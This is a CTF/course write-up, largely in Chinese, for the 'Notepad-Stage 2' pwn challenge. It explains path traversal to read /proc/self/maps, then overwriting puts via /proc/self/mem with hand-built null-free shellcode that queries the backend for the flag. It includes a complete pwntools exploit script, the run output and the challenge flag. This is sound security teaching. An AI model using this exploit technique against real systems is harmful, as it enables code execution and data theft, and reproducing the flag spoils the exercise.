---
title: Simple PWN 0x32(2023 HW - Notepad-Stage 2)
tags: [eductf, CTF, PWN]

category: "Security｜Course｜NTU CS｜PWN"
date: 2024-01-31
---

# Simple PWN 0x32(2023 HW - Notepad-Stage 2)
<!-- more -->

## Description & Hint
> Try to get /flag_backend.
>
>Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
>Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.

## Source code
呈上題

## Recon
:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::
* Recap
    在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:
    ```python
    def read_any_file(file_name):
        payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
        offset = 0
        res = ''
        while(True):
            ret = dealing_cmd(r, 5, payload, offset=str(offset).encode())
            # print(ret, len(ret))
            if ret != 'Read note failed.' and ret != "Couldn't open the file.":
                res += ret
                offset += 128
            else:
                log.success(res)
                break
        return res
    ```
1. ==漏洞發想==
    透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下[虛擬內存探究 -- 第一篇:C strings & /proc](http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/)，要做的事情和我們的幾乎一樣，簡單說就是
    > /proc/[pid]/mem
    >        This file can be used to access the pages of a process's memory through open(2), read(2), and lseek(2).
    >        Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).
    >        
    > /proc/[pid]/maps
    >        A file containing the currently mapped memory regions and their access permissions.  See mmap(2) for some further information about memory mappings.
    >        Permission to access this file is governed by a ptrace access mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2).
    >        The format of the file is:
    >        
    >        address           perms offset  dev   inode       pathname
    >        00400000-00452000 r-xp 00000000 08:02 173521      /usr/bin/dbus-daemon
    >        00651000-00652000 r--p 00051000 08:02 173521      /usr/bin/dbus-daemon
    >        00652000-00655000 rw-p 00052000 08:02 173521      /usr/bin/dbus-daemon
    >        00e03000-00e24000 rw-p 00000000 00:00 0           [heap]
    >        00e24000-011f7000 rw-p 00000000 00:00 0           [heap]
    >        ...
    >        35b1800000-35b1820000 r-xp 00000000 08:02 135522  /usr/lib64/ld-2.15.so
    >        35b1a1f000-35b1a20000 r--p 0001f000 08:02 135522  /usr/lib64/ld-2.15.so
    >        35b1a20000-35b1a21000 rw-p 00020000 08:02 135522  /usr/lib64/ld-2.15.so
    >        35b1a21000-35b1a22000 rw-p 00000000 00:00 0
    >        35b1c00000-35b1dac000 r-xp 00000000 08:02 135870  /usr/lib64/libc-2.15.so
    >        35b1dac000-35b1fac000 ---p 001ac000 08:02 135870  /usr/lib64/libc-2.15.so
    >        35b1fac000-35b1fb0000 r--p 001ac000 08:02 135870  /usr/lib64/libc-2.15.so
    >        35b1fb0000-35b1fb2000 rw-p 001b0000 08:02 135870  /usr/lib64/libc-2.15.so
    >        ...
    >        f2c6ff8c000-7f2c7078c000 rw-p 00000000 00:00 0    [stack:986]
    >        ...
    >        7fffb2c0d000-7fffb2c2e000 rw-p 00000000 00:00 0   [stack]
    >        7fffb2d48000-7fffb2d49000 r-xp 00000000 00:00 0   [vdso]
    從以上訊息我們知道，/proc/[pid]/mem就是實際執行該隻process的memory，而/proc/[pid]/maps就是該隻process的memory mapping，所以關於怎麼利用可以看一下[csdn的這篇文章](https://blog.csdn.net/dog250/article/details/108618568)，基本上要做的事情和我們差不多，目標都是去修改/proc/[pid]/mem中的value，不過中間有很多東西需要考慮:
    1. 要寫甚麼shellcode
    2. 要寫去哪裡
    
2. 先看要寫去哪裡
    按照前面所說應該是要寫/proc/[pid]/mem，但因為前面有提到他只能被open / read / lseek給access，所以目標應該是找出lseek的offset，並且把噁爛shellcode放進去；另外一個問題是我們不知道要寫到哪裡，所以我們可以利用前面的arbitrary read去看process的mapping為何，如下
    ```python
    # Read /proc/self/maps to leak Libc Base
    maps_layout = read_any_file(b'/proc/self/maps').split('\n')
    libc_base = int(maps_layout[7][:12], 16)
    puts_addr = libc_base + libc.symbols['puts']
    log.success(f"Libc Base address: {hex(libc_base)}")
    log.success(f'Puts Address: {hex(puts_addr)}')
    ```
    這樣的話，我們就知道他位於整個memory layout，以及我們想要置換的puts symbols的位置
3. 要寫甚麼
    前面有提到我們需要寫shellcode進去，以替換puts的行為，所以我們需要寫些甚麼server才能噴flag給我們呢?如下
    ```cpp
    # Socket Config
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in info;
    info.sin_family = PF_INET;
    info.sin_addr.s_addr = inet_addr("127.0.0.1");
    info.sin_port = htons(8765);

    # Connect to Backend
    connect(fd, (struct sockaddr *)&info, sizeof(info))
        
    # Write 0x8787 to fd
    struct Command cmd;
    cmd.cmd = 0x8787;
    write(fd, &cmd, sizeof(cmd));

    # Read the result from fd
    struct Response res;
    read(fd, $rsp, sizeof(res);
         
    # Write the result from fd to stdout
    write(1, $rsp, 0x40);
    ```
    簡單來說，前面需要我們設定socket的config，然後用這個config連線到後端，並且把command置換成0x8787，傳送到後端給的fd，這樣後段就會直接噴flag給我們(準確來說是那個fd)，所以我們要承接fd接到的flag並且送到stdout，大概是這樣，但這一連串的操作其實是助教一開始在課堂中有提示，並且看了@cs-otaku的WP也有提到該步驟才知道，所以如果都不知道以上操作的話要怎麼辦呢?我們可以想辦法把backend的binary讀出來，這樣的話就只能自行把backend的binary讀出來再去分析裡面的奧義
    
    我是直接用[godbolt](https://godbolt.org/)搭配[x86-64 disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)
    :::spoiler godbolt Result
    ![image](https://hackmd.io/_uploads/B1hxShgL6.png)
    :::
    不過正如@cs-otaku說的
    > 寫入content是用write去寫的。所以shellcode裡面不可以出現\x00這種東西

    所以我也是邊參考disassembly的結果慢慢看中間有沒有\x00的byte，如果有就要想其他的payload替換掉
    
    1. Socket Config
        像是這邊我不知道`AF_INET`所代表的byte是多少就可以直接看godbolt的結果，另外syscall要用哪一個可以參考[linux x86-64 syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)，並且根據calling convention把shellcode擺好，切記看完之後要看一下轉換成shellcode看有沒有\x00的byte，可以用pwntools的asm function或是直接用[x86-64 disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)都可以達到一樣的效果
        ![image](https://hackmd.io/_uploads/HJUeP3lUp.png)
        ```python
        # int fd = socket(AF_INET, SOCK_STREAM, 0);
        socket = """
            xor rax, rax
            mov al, 0x29

            xor rdi, rdi
            mov dil, 0x2

            xor rsi, rsi
            mov sil, 0x1

            xor rdx, rdx

            syscall
            mov r8, rax
        """
        ```
    2. Connect
        這邊主要需要觀察protocol怎麼包，首先我們知道第一個參數是存\$rdi，也就是存上一個syscall的return value存起來的\$r8，至於\$rsi的info address，其內容應該怎麼包含甚麼呢?我們先看一下[linux x86-64 syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)中的說明
        ![image](https://hackmd.io/_uploads/BktiY2e8a.png)
        他所需的是`struct sockaddr_in info;`，而實際去看看sockaddr_in會發現他的結構如下([csdn post](https://blog.csdn.net/dongyanxia1000/article/details/80683738)):
        ```
        struct sockaddr_in {
                short   sin_family;         //address family
                u_short sin_port;           //16 bit TCP/UDP port number
                struct  in_addr sin_addr;   //32 bit IP address
                char    sin_zero[8];        //not use, for align
        };
        ```
        就會對應到底下註解的地方，包含IP / Post / Internet Family之類的，所以我們就可以按照這個structure建構出來，short是2 bytes，而根據前面的byte code會發現`AF_INET`是\x0002，也就是兩個bytes，第二個是port也是兩個bytes，8765轉成hex就是0x223d；最後一個是IP address，總共是4 bytes的in_addr structure，如果想詳細了解in_addr的結構可以看[MSDN](https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/ns-winsock2-in_addr?source=docs)，但具體來說就是把`127.0.0.1`→`7f000001`，所以全部貼在一起並且轉成little endian的話就會變成==0x100007f3d220002==，但有一個非常大的問題，如果直接把該值push進到stack並取\$rsp放到\$rsi的話，整個流程會有太多的\x00，因此@cs-otaku提供了一個非常有創意的想法，就直接用扣的，反正只要最後放到stack的值是對的就好了
        ```python
        # struct sockaddr_in info;
        # info.sin_family = AF_INET;
        # info.sin_addr.s_addr = inet_addr("127.0.0.1");
        # info.sin_port = htons(8765);
        # connect(fd, (struct sockaddr *)&info, sizeof(info));
        connect = """
            xor rax, rax
            mov al, 0x2a

            mov rdi, r8

            mov rsi, 0xffffffffffffffff
            mov r9, 0xfeffff80c2ddfffd
            sub rsi, r9
            push rsi
            mov rsi, rsp

            xor rdx, rdx
            mov dl, 0x10

            syscall
        """
        ```
    3. Write
        這一段主要是置換原本不應該出現的command，因為按照原本程式的流程，只會有CMD_Register→0x1 / CMD_Login→0x2 / CMD_GetFolder→0x11 / CMD_NewNote→0x12等這四種，分別會在對應的操作下傳到backend後讓他做對應的操作，現在我們要把cmd.cmd改成0x8787，之後用write把這個command寫到對應的fd中，如同其他command也那樣操作一樣
        ```python
        # struct Command cmd;
        # cmd.cmd = 0x8787; // #define CMD_Flag 0x8787
        # write(fd, &cmd, sizeof(cmd));
        write = """
            xor r9, r9
            mov r9w, 0x8787
            push r9

            xor rax, rax
            mov al, 0x1

            mov rdi, r8

            mov rsi, rsp

            xor rdx, rdx
            mov dl, 0xa4

            syscall
        """
        ```
    4. Read
        這一段原本的command應該是`read(fd, &res, sizeof(res))`，我們會去接res傳回來的結果，所以後面的size應該直接看res他的結構有多大而定，總共是一個uint32_t的code + 256個char，所以是260 bytes，也就是0x104，並且我們把res的地址傳給\$rsp
        ```python
        # read(fd, $rsp, sizeof(res));
        read = """
            xor rax, rax

            mov rdi, r8

            mov rsi, rsp

            xor rdx, rdx
            mov dx, 0x104

            syscall
        """
        ```
    5. Write 2 Console
        現在我們已經取得backend傳回來的response，但前端還沒辦法顯示，所以我們需要寫到stdout
        ```python
        # write(1, $rsp, 0x40);
        write2console = """
            xor rax, rax
            mov al, 0x1

            xor rdi, rdi
            mov dil, 0x1

            mov rsi, rsp

            xor rdx, rdx
            mov dl, 0x40

            syscall
        """
        ```
4. 接著我們就只要透過command 4的write note功能把構建好的shellcode，寫到/proc/self/mem對應的位置就好，也就是置換掉puts原本的操作，讓他再次call到puts的時候就會執行我們的shellcode

## Exploit - Arbitrary Read → Arbitrary Write → Shellcode
:::spoiler
```python
from pwn import *
from tqdm import *

context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
def dealing_cmd(r, cmd, note_name=b'test', content=b'test\n', offset=b'0', random='0'):
    r.recvlines(7)
    if cmd == 1 or cmd == 2:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Username: ', b'sbk' + random.encode())
        r.sendlineafter(b'Password: ', b'sbk' + random.encode())
        if b'Success' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error('Command Login Failed!!!')
    
    if cmd == 3:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'created' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 4:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', str(offset).encode())
        r.sendlineafter(b'Content Length: ', str(len(content)).encode())
        r.sendlineafter(b'Content: ', content)
        log.success('Done')
    
    if cmd == 5:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        res = r.recv(128).decode().strip()
        return res

def read_any_file(file_name):
    payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
    offset = 0
    res = ''
    while(True):
        ret = dealing_cmd(r, 5, payload, offset=str(offset).encode())
        # print(ret, len(ret))
        if ret != 'Read note failed.' and ret != "Couldn't open the file.":
            res += ret
            offset += 128
        else:
            log.success(res)
            break
    return res

def ugly_shellcode():
    # int fd = socket(AF_INET, SOCK_STREAM, 0);
    socket = """
        xor rax, rax
        mov al, 0x29

        xor rdi, rdi
        mov dil, 0x2

        xor rsi, rsi
        mov sil, 0x1

        xor rdx, rdx

        syscall
        mov r8, rax
    """

    # info.sin_family = AF_INET;
    # info.sin_addr.s_addr = inet_addr("127.0.0.1");
    # info.sin_port = htons(8765);
    # connect(fd, (struct sockaddr *)&info, sizeof(info));
    connect = """
        xor rax, rax
        mov al, 0x2a

        mov rdi, r8

        mov rsi, 0xffffffffffffffff
        mov r9, 0xfeffff80c2ddfffd
        sub rsi, r9
        push rsi
        mov rsi, rsp

        xor rdx, rdx
        mov dl, 0x10

        syscall
    """

    # struct Command cmd;
    # cmd.cmd = 0x8787; // #define CMD_Flag 0x8787
    # write(fd, &cmd, sizeof(cmd));
    write = """
        xor r9, r9
        mov r9w, 0x8787
        push r9

        xor rax, rax
        mov al, 0x1

        mov rdi, r8

        mov rsi, rsp

        xor rdx, rdx
        mov dl, 0xa4

        syscall
    """

    # read(fd, $rsp, sizeof(res));
    read = """
        xor rax, rax

        mov rdi, r8

        mov rsi, rsp

        xor rdx, rdx
        mov dx, 0x104

        syscall
    """

    # write(1, $rsp, 0x40);
    write2console = """
        xor rax, rax
        mov al, 0x1

        xor rdi, rdi
        mov dil, 0x1

        mov rsi, rsp

        xor rdx, rdx
        mov dl, 0x40

        syscall
    """
        
    return socket + connect + write + read + write2console

# Register & Login
init_port = sys.argv[1]
r = remote('10.113.184.121', init_port)
random = os.urandom(1).hex()
dealing_cmd(r, 2, random=random)
dealing_cmd(r, 1, random=random)

# Read /proc/self/maps to leak Libc Base
maps_layout = read_any_file(b'/proc/self/maps').split('\n')
libc_base = int(maps_layout[7][:12], 16)
puts_addr = libc_base + libc.symbols['puts']
log.success(f"Libc Base address: {hex(libc_base)}")
log.success(f'Puts Address: {hex(puts_addr)}')

# Get Shellcode
shellcode = asm(ugly_shellcode())
log.info(f'Shellcode = {shellcode}')

# write 2 /proc/self/mem
file_name = b'/proc/self/mem'
path = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
dealing_cmd(r, 4, note_name=path, content=shellcode, offset=puts_addr)

r.interactive()
```
:::

```bash
$ python exp-2.py 28961
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 10.113.184.121 on port 28961: Done
[+] Command Register Successful
[+] Command Login Successful
[+] 55cd58958000-55cd58959000 r--p 00000000 08:01 22676106                   /home/notepad/notepad
    55cd58959000-55cd5895b000 r-xp 00001000 08:01 22676106                   /home/notepad/notepad
    55cd5895b000-55cd5895c000 r--p 00003000 08:01 22676106/home/notepad/notepad
    55cd5895c000-55cd5895d000 r--p 00003000 08:01 22676106                   /home/notepad/notepad
    55cd5895d000-55cd5895e000 rw-p 00004000 08:01 22676106                   /home/notepad/notepad
    55cd595e1000-55cd59602000 rw-p 00000000 00:00 0                          [heap]
    7f8b72c44000-7f8b72c47000 rw-p 00000000 00:00 0
    7f8b72c47000-7f8b72c6f000 r--p 00000000 08:01 22554614                   /usr/lib/x86_64-linux-gnu/libc.so.6
    7f8b72c6f000-7f8b72e04000 r-xp 00028000 08:01 22554614/usr/lib/x86_64-linux-gnu/libc.so.6
    7f8b72e04000-7f8b72e5c000 r--p 001bd000 08:01 22554614                   /usr/lib/x86_64-linux-gnu/libc.so.6
    7f8b72e5c000-7f8b72e60000 r--p 00214000 08:01 22554614                   /usr/lib/x86_64-linux-gnu/libc.so.6
    7f8b72e60000-7f8b72e62000 rw-p 00218000 08:01 22554614                   /usr/lib/x86_64-linux-gnu/libc.so.6
    7f8b72e62000-7f8b72e6f000 rw-p 00000000 00:00 0
    7f8b72e71000-7f8b72e73000 rw-p 00000000 00:00 0
    7f8b72e73000-7f8b72e75000 r--p 00000000 08:01 22554596                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f8b72e75000-7f8b72e9f000 r-xp 00002000 08:01 22554596                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f8b72e9f000-7f8b72eaa000 r--p 0002c000 08:01 22554596                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f8b72eab000-7f8b72ead000 r--p 00037000 08:01 22554596/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7f8b72ead000-7f8b72eaf000 rw-p 00039000 08:01 22554596/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    7ffc5d268000-7ffc5d289000 rw-p 00000000 00:00 0[stack]
    7ffc5d35b000-7ffc5d35f000 r--p 00000000 00:00 0                          [vvar]
    7ffc5d35f000-7ffc5d361000 r-xp 0000000000:00 0                          [vdso]
[+] Libc Base address: 0x7f8b72c47000
[+] Puts Address: 0x7f8b72cc7e50
[*] Shellcode = b'H1\xc0\xb0)H1\xff@\xb7\x02H1\xf6@\xb6\x01H1\xd2\x0f\x05I\x89\xc0H1\xc0\xb0*L\x89\xc7H\xc7\xc6\xff\xff\xff\xffI\xb9\xfd\xff\xdd\xc2\x80\xff\xff\xfeL)\xceVH\x89\xe6H1\xd2\xb2\x10\x0f\x05M1\xc9fA\xb9\x87\x87AQH1\xc0\xb0\x01L\x89\xc7H\x89\xe6H1\xd2\xb2\xa4\x0f\x05H1\xc0L\x89\xc7H\x89\xe6H1\xd2f\xba\x04\x01\x0f\x05H1\xc0\xb0\x01H1\xff@\xb7\x01H\x89\xe6H1\xd2\xb2@\x0f\x05'
[+] Done
[*] Switching to interactive mode
\x00\x00\x00\x00flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$
```

Flag: `flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}`